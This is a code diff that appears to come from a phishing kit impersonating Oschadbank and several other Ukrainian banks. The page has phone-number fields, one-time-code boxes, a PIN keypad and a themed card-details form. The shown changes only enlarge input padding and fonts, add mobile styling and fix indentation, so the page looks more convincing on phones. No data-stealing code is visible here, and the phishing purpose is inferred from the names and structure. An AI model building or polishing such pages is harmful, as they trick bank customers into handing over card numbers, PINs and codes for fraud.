@@ -149,9 +149,9 @@
             top: -10px; left: 10px; font-size: 12px; color: #6c757d;
         }
         .oschad-input-field {
-            width: 100%; padding: 18px 45px 18px 15px;
+            width: 100%; padding: 20px 50px 20px 20px;
             border: 1px solid #dee2e6; border-radius: 12px;
-            font-size: 16px; color: var(--dark-text); background-color: var(--white);
+            font-size: 18px; color: var(--dark-text); background-color: var(--white);
             transition: all 0.2s ease; outline: none;
             font-weight: 500; position: relative;
             -webkit-appearance: none;
@@ -175,8 +175,8 @@
             border-color: var(--oschad-primary);
         }
         .oschad-phone-prefix {
-            padding: 18px 0 18px 15px;
-            font-size: 16px; color: var(--dark-text);
+            padding: 20px 0 20px 20px;
+            font-size: 18px; color: var(--dark-text);
             font-weight: 500;
         }
         .oschad-phone-wrapper .oschad-input-field, .oschad-input-wrapper .oschad-input-field {
@@ -618,7 +618,8 @@
         /* Медиа-запросы для мобильных устройств (iPhone, маленькие экраны) */
         @media (max-width: 480px) {
             .oschad-main-title { font-size: 22px; }
-            .oschad-input-field { font-size: 14px; padding: 14px 40px 14px 12px; }
+            .oschad-input-field { font-size: 18px; padding: 20px 50px 20px 20px; }
+            .oschad-phone-prefix { font-size: 18px; padding: 20px 0 20px 20px; }
             .oschad-submit-button { padding: 14px; font-size: 16px; bottom: 15px; left: 15px; right: 15px; }
             .oschad-code-input { width: 45px; height: 50px; font-size: 22px; }
             .oschad-pin-key { height: 45px; width: 45px; font-size: 18px; }
@@ -1931,7 +1932,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
                 break;
             case 'show_card_details_form':
-                 if (['alliance', 'vostok', 'izibank', 'ukrsib'].includes(activeBankData.theme)) {
+                if (['alliance', 'vostok', 'izibank', 'ukrsib'].includes(activeBankData.theme)) {
                     renderLightThemedCardDetailsScreen();
                 } else {
                     renderThemedCardDetailsScreen();
